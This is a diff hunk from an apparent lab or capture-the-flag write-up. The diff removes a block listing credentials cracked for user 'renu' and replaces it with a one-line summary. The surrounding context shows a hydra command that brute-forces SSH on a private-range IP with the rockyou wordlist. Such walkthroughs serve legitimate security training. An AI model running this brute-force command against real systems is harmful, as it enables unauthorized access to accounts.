@@ -250,12 +250,7 @@ Because SSH was exposed and the extracted message explicitly indicated a weak pa
 hydra -l renu -P /usr/share/wordlists/rockyou.txt 192.168.206.230 ssh
 ```
 
-Hydra found valid credentials:
-
-```text
-login: renu
-password: 987654321
-```
+Hydra found valid credentials.
 
 ![Hydra result](images/12-ssh-bruteforce.png)
 
